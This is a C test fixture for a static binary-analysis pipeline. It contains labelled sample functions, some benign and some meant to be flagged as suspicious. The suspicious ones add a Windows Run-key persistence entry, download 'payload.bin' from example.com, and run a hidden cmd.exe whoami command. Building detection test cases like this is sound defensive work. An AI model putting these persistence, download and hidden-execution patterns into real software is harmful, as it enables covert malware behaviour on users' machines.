/*
 * test_fixture.c -- BENIGN test fixture for pipeline smoke-testing.
 *
 * This program is never meant to be executed. It only exists so that the
 * static pipeline (angr CFG -> function scoring -> API/argument extraction ->
 * rule verification) has a small PE with known, hand-written functions whose
 * expected output we can check against.
 *
 * Functions (exported only so build.sh can emit ground_truth.json; the pipeline never reads names):
 *   compute_checksum   : pure arithmetic, no API calls            (expected: benign)
 *   log_message        : writes a text line to a local log file   (expected: benign)
 *   persist_run_key    : writes a Run-key registry value          (expected: suspicious, persistence)
 *   fetch_remote_file  : downloads a URL to disk                  (expected: suspicious, download)
 *   run_shell_command  : launches a command line via WinExec      (expected: suspicious, execution)
 */
#include <windows.h>
#include <urlmon.h>
#include <stdio.h>

__declspec(dllexport) __attribute__((noinline))
unsigned int compute_checksum(const unsigned char *buf, unsigned int len) {
    unsigned int h = 5381;
    for (unsigned int i = 0; i < len; i++) {
        h = ((h << 5) + h) ^ buf[i];
    }
    return h;
}

__declspec(dllexport) __attribute__((noinline))
void log_message(const char *msg) {
    HANDLE f = CreateFileA("C:\\Temp\\app.log", FILE_APPEND_DATA, FILE_SHARE_READ,
                           NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f != INVALID_HANDLE_VALUE) {
        DWORD written = 0;
        WriteFile(f, msg, (DWORD)lstrlenA(msg), &written, NULL);
        CloseHandle(f);
    }
}

__declspec(dllexport) __attribute__((noinline))
int persist_run_key(void) {
    HKEY key;
    const char *path = "C:\\Users\\Public\\updater.exe";
    LONG r = RegOpenKeyExA(HKEY_CURRENT_USER,
                           "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                           0, KEY_SET_VALUE, &key);
    if (r != ERROR_SUCCESS) return -1;
    r = RegSetValueExA(key, "SystemUpdater", 0, REG_SZ,
                       (const BYTE *)path, (DWORD)lstrlenA(path) + 1);
    RegCloseKey(key);
    return (int)r;
}

__declspec(dllexport) __attribute__((noinline))
int fetch_remote_file(void) {
    HRESULT hr = URLDownloadToFileA(NULL, "http://example.com/payload.bin",
                                    "C:\\Users\\Public\\payload.bin", 0, NULL);
    return (int)hr;
}

__declspec(dllexport) __attribute__((noinline))
int run_shell_command(void) {
    return (int)WinExec("cmd.exe /c whoami > C:\\Temp\\who.txt", SW_HIDE);
}

int main(int argc, char **argv) {
    unsigned char data[16] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
    unsigned int c = compute_checksum(data, sizeof(data));
    log_message("started\n");
    if (argc > 5) {            /* never taken in normal use */
        persist_run_key();
        fetch_remote_file();
        run_shell_command();
    }
    return (int)(c & 1);
}
